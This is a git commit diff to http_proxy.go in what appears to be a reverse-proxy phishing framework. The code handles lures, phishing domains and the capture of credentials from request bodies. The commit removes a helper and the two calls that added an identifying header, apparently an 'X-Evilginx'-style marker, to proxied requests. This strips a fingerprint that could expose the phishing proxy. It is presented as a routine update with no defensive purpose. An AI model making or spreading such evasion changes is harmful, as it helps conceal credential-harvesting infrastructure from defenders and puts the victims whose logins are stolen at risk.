73a948d74282148fdc250083889cf8201a060f03
thornejames <103476856+thornejames@users.noreply.github.com>
2026-09-08 14:27:27 +1000

    Update http_proxy.go

--- core/http_proxy.go
+++ core/http_proxy.go
@@ -466,8 +466,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
-
+				
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
 						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
@@ -666,7 +665,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1796,10 +1795,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	}
 
 	return "", false
-}
-
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
